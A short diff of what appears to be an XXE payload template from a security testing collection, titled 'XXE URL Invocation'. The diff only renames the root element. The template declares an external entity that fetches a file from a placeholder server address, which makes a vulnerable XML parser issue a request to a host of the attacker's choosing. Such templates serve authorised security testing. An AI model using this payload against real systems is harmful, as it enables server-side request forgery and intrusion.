@@ -4,8 +4,8 @@
 name: XXE URL Invocation
 description: Server Side Request Forgery Attack via External Entity Expansion (XXE)
 -->
-<!DOCTYPE data [
-  <!ELEMENT data ANY>
+<!DOCTYPE root [
+  <!ELEMENT root ANY>
   <!ENTITY remote SYSTEM "http://{server_address}/file.xml">
 ]>
-<data>&remote;</data>
+<root>&remote;</root>
